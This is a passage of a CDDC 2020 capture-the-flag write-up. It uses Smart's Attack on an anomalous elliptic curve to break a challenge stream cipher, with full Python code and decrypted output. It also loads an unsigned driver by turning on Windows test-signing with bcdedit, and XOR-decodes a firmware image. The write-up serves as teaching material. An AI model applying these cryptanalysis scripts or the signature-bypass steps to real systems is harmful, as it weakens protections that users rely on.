Recovering `s` via `r = sQ` is a little more challenging. In a proper implementation this would be impossible except via bruteforce due to the [Discrete Logarithm Problem](https://en.wikipedia.org/wiki/Elliptic-curve_cryptography). This turns out to be impractical with this challenge (I tried). However, in the event that the order of the curve is equal to the order of the finite field, i.e. equal to the prime used in `code.py`, there is something called the [Smart's Attack](https://wstein.org/edu/2010/414/projects/novotney.pdf) that enables recovering of `s` from `r = sQ` in linear time. An implementation of Smart's Attack can be found in the Python library [ecpy](https://github.com/elliptic-shiho/ecpy)

```python
p = 112817876910624391112586233842848268584935393852332056135638763933471640076719
A = 49606376303929463253586154769489869489108883753251757521607397128446713725753
B = 79746959374671415610195463996521688925529471350164217787900499181173830926217
P = 112817876910624391112586233842848268584935393852332056135638763933471640076719
Px = 103039657693294116462834651854367833897272806854412839639851017006923575559024
Py = 77619251402197618012332577948300478225863306465872072566919796455982120391100
Qx = 54754931428196528902595765731417656438047316294230479980073352787194748472682
Qy = 31061354882773147087028928252065932953521048346447896605357202055562579555845
F = FiniteField(p)
E = EllipticCurve(F, A, B)
Q = E(Qx, Qy)
P = E(Px, Py)
e = SSSA_Attack(F, E, Q, P)
assert Q * e == P
print ("[+] e = %d" % e)

# >>> [+] e = 72529124805871229360171330254593943220566431521453438361067644203504289580075
```

Now, we can directly apply Smart's Attack to recover `s`. However, remember that we have to bruteforce a maximum of 65536 different `r`. It proves to be slow to apply Smart's Attack that many time. We can get around this by computing a value `e` where `eQ = P`, which requires one application of Smart's Attack, and then `s'` for the next iteration can simply be calculated as `s' = sP = s * eQ = e * sQ = e * r`. We can then use this new `s'` to decrypt the first 3 bytes of the 8th chunk and compare it with that in `partial_plaintext.txt`

```python
enc = open('Challenge Files/enc.txt', 'r').read()
ct = bytearray([int(enc[2*i:2*i+2], 16) for i in range(len(enc)//2)])[210:] # Get bytearray from enc with offset 210
pt = b'been done and we are seeing extre'

pt30 = pt[:30]
ct30 = ct[:30]
r30 = [x^y for x,y in zip(pt30, ct30)]

def get_r(pt30, ct30, r30):
    'Generates all possible values of r'
    m = int(r30[0])
    for c in r30[1:]:
        m *= 256
        m += c
    x = m
    i = 0
    while True:
        i += 1
        x += 2**(30*8) #* 60359
        y = E.get_corresponding_y(x)
        if y:
            yield i, E(x,y)

for i, r in get_r(pt30, ct30, r30):
    print(i, end='\r')
    s2 = (e * r).x.x
    r2 = (Q * s2).x.x & (2**(30*8) - 1)
    pt_dec = []
    for j in range(1,4):
        pt_dec += bytearray([((r2>>((30-j)*8))&0xff)^ct[30*1+j-1]])
    pt_dec = bytes(pt_dec)
    if pt_dec == pt[30:]:
        break

# >>> 60359
```

Alright! So we've found both `r` and `s'`! We can simply feed `s'` as a seed into the decryption function in `code.py` to decrypt everything from the 9th chunk onwards!

```python
from code import *

ec = EC(A,B,p)
P0 = Point(Px, Py)
Q0 = Point(Qx, Qy)

s = STREAM(ec, s2, P0, Q0)
print(s.decryption(ct[60:]).decode('utf-8'))

# up to 98%. We are ready to inject this odourless, colourless and tasteless liquid into all our water pumps. Prepare yourselves for CDDC20{maS5_brA1nwashINg_anD_w0rLD_dOMINA7ioN}!! HAHAHAHAHHAAAAA cheers to the success of our evil planz!!!
```

Though we have obtained the flag, we can still decrypt it even more

If we apply Smart's Attack 9 more times, we can recover the original seed. However, at every iteration, there are two solutions for `s`, namely `s` and `p-s`, where `p` is the modulo of the finite field, which isn't a problem, just bruteforce all solutions

```python
s1 = s2
s1 =     SSSA_Attack(F, E, P, E(s1, E.get_corresponding_y(s1)))
s1 =     SSSA_Attack(F, E, P, E(s1, E.get_corresponding_y(s1)))
s1 = p - SSSA_Attack(F, E, P, E(s1, E.get_corresponding_y(s1)))
s1 =     SSSA_Attack(F, E, P, E(s1, E.get_corresponding_y(s1)))
s1 = p - SSSA_Attack(F, E, P, E(s1, E.get_corresponding_y(s1)))
s1 = p - SSSA_Attack(F, E, P, E(s1, E.get_corresponding_y(s1)))
s1 = p - SSSA_Attack(F, E, P, E(s1, E.get_corresponding_y(s1)))
s1 = p - SSSA_Attack(F, E, P, E(s1, E.get_corresponding_y(s1)))
s1 = p - SSSA_Attack(F, E, P, E(s1, E.get_corresponding_y(s1)))

ct = bytearray([int(enc[2*i:2*i+2], 16) for i in range(len(enc)//2)])

s = STREAM(ec, s1, P0, Q0)
print(s.decryption(ct).decode('utf-8'))

# >>> Greetingzz, my fellow comrades from Unduplicitous Corp. Our researchers have made tremendous progress with Brainwashing Agent 2.0 - it is now alot more effective than the previous version. Thorough testing has been done and we are seeing extremely high success rates of up to 98%. We are ready to inject this odourless, colourless and tasteless liquid into all our water pumps. Prepare yourselves for CDDC20{maS5_brA1nwashINg_anD_w0rLD_dOMINA7ioN}!! HAHAHAHAHHAAAAA cheers to the success of our evil planz!!!

print('Possible seed used:')
print('\tdec: %d'%(s1))
print('\thex: %s'%hex(s1)[2:])

# >>> Possible seed used:
# >>>	dec: 151386116941948313024325411690796683746
# >>>	hex: 71e3e7d3fac11617c282d57c4ab211e2
```

#### Referenced from [Julian's writeup](https://github.com/JuliaPoo/Collection-of-CTF-Writeups/tree/master/CDDC2020/A%20Kind%20of%20Crypto)

Flag: `CDDC20{maS5_brA1nwashINg_anD_w0rLD_dOMINA7ioN}`

---

### <a name="wg-2-6"></a>Overly Obsessed with Marvel

![marvel]({{ site.baseurl }}/assets/img/CDDC20/Overly_obsessed_with_marvel.png)

The executable is still vmprotected like the cancer Spin.exe was, so just debug it on runtime

```
arg 0: 0x000000314079f5f0 (type=HANDLE*, size=0x8)
arg 1: 0xc0100080 (type=unsigned int, size=0x4)
arg 2: len=0x30, root=0x0, name=28/30 "\??\RED_DARAMZ", att=0x40, sd=0x0000000000000000, sqos=0x000000314079f698 (type=OBJECT_ATTRIBUTES*, size=0x8)
arg 3: 0x000000314079f608 (type=IO_STATUS_BLOCK*, size=0x8)
arg 4: <null> (type=LARGE_INTEGER*, size=0x8)
arg 5: 0x0 (type=named constant, size=0x4)
arg 6: FILE_SHARE_READ|FILE_SHARE_WRITE (type=named constant, value=0x3, size=0x4)
arg 7: FILE_OPEN (type=named constant, value=0x1, size=0x4)
arg 8: FILE_SYNCHRONOUS_IO_NONALERT|FILE_NON_DIRECTORY_FILE (type=named constant, value=0x60, size=0x4)
arg 9: <null> (type=<struct>*, size=0x8)
arg 10: 0x0 (type=unsigned int, size=0x4)
failed (error=0xc0000034) =>
arg 0: 0x000000314079f5f0 => 0x1 (type=HANDLE*, size=0x8)
arg 3: status=0x4d2aa4b8, info=0x7fff4d2aa4b8 (type=IO_STATUS_BLOCK*, size=0x8)
retval: 0xc0000034 (type=NTSTATUS, size=0x4)
```

Nothing notable can be obtained, except for `\??\RED_DARAMZ` file location which the executable accesses

The executable just prints a globe with `Save The Earth` and 3 hexadecimal numbers writing `HELP ME SAVE THE EARTH`

No time to reverse the VMProtect, as seen by the number of solves, this challenge should have an easier way of obtaining the flag

We are provided a Windows driver, so let's install the service

```
sc.exe create Marvel binpath= C:\Windows\System32\drivers\Captain_Marvel.sys type= kernel
```

The driver provided is not signed, so we just allow it to start using bcdedit

```
Bcdedit.exe -set TESTSIGNING ON
```

```
sc.exe start Marvel
```

![started service]({{ site.baseurl }}/assets/img/CDDC20/Files/marvel-1.png)

After rebooting for the bcdedit command to be implemented, start the service and run the `The_Avengers.exe`

![printed flag]({{ site.baseurl }}/assets/img/CDDC20/Files/marvel-2.png)

Due to the started service, there is no need to reverse the executable at all

Flag: `CDDC20{Th4nk_you_IR0NMAN!_I_lov3_3000_S2}`

---

## Warp Gate 1

### <a name="wg-1-1"></a>Firmware X-tract-or

![firmware]({{ site.baseurl }}/assets/img/CDDC20/Firmware_X-tract-or.png)

From the title, it strongly suggests to use XOR

![hexeditor]({{ site.baseurl }}/assets/img/CDDC20/Files/firmware.png)

Looking at the hex dump of the file, it shows a pattern right from the start, in places where should have been NULL bytes, i.e. patterns of `2959`

```python
with open('firmware.bin', 'rb') as fp:
    byt = fp.read()
    
xored = ''.join([chr(ord(b) ^ [0x29, 0x59][i%2]) for i, b in enumerate(byt)])
```

By iterating through the file XORing with 0x29 and 0x59 consecutively, the output generated gives a filetype of a Squashfs filesystem with a blocksize of 131072 Bytes

After mounting the filesystem, the root directory of the filesystem contains the flag file, thus obtaining the flag

Flag: `CDDC20{x0r_tH3_BE5T_L0Gic4L_oP3rA70R_EVeR}`
